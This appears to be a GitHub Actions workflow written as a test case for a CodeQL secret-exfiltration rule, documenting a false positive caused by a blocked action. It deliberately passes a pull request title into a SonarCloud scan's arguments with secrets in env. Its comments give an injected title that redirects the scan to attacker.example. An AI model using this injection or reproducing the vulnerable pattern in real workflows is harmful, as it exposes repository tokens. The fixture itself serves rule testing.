# situation: the workflow of the true positive action-input
#   (action-input.yml) of the rule, with a job added whose step uses
#   example-org/not-allowed-action, which the setting of allowed actions of
#   GitHub (repo.allowed-actions) blocks with
#   !example-org/not-allowed-action@*. In the true positive, the test of
#   CodeQL's actions/secret-exfiltration: on pull_request_target, the scan
#   of SonarSource's action gets the pull request's title in args, with
#   SONAR_TOKEN in env.
# reason: GitHub checks each uses of the workflow before the run starts, and
#   does not start the run because of the uses of
#   example-org/not-allowed-action: no job of the run runs, so what the
#   reason of the true positive says does not happen (in runs that the
#   authors of the rule made on GitHub, such runs ended as startup_failure).
# cause: the rule does not read repo.allowed-actions.
# attack: the author of a pull request from a fork titles the pull request x
#   -Dsonar.host.url=https://attacker.example.
# attack-run-behavior: GitHub does not start the run, so no step of the run
#   runs, and the attack does nothing.
name: test
on:
  pull_request_target:
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: sonarsource/sonarcloud-github-action@master
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
        with:
          args: >
            -Dsonar.scm.revision=${{ github.event.workflow_run.head_sha }}
            -Dsonar.pullrequest.key=${{ github.event.pull_request.title }}
  not-allowed:
    runs-on: ubuntu-latest
    steps:
      - uses: example-org/not-allowed-action@eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee
